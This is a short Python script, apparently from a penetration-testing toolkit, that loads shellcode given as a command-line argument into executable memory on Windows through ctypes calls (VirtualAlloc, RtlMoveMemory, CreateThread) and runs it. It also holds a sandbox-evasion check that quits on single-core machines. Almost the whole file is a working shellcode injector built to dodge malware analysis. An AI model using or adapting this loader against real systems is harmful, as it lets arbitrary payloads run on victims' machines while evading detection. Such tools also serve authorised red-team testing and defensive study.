#!/usr/bin/python
import ctypes
import sys
import multiprocessing

# Written by Dave Kennedy (ReL1K) @ TrustedSec.com
# Injects shellcode into memory through Python and ctypes
#
# Initial awesome code and credit found here:
# http://www.debasish.in/2012_04_01_archive.html

# added sandbox evasion here - most sandboxes use only 1 core
if multiprocessing.cpu_count() < 2:
    exit()

# see if we specified shellcode
try:
    sc = sys.argv[1]

# if we didn't specify a param
except IndexError:
    sys.exit()

# need to code the input into the right format through string escape
sc = sc.decode("string_escape")

# convert to bytearray
sc = bytearray(sc)

# use types windll.kernel32 for virtualalloc reserves region of pages in
# virtual address space
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(sc)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

# use virtuallock to lock region for physical address space
ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr),
                                   ctypes.c_int(len(sc)))

# read in the buffer
buf = (ctypes.c_char * len(sc)).from_buffer(sc)

#  moved the memory in 4 byte blocks
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(sc)))
# launch in a thread
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))
# waitfor singleobject
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
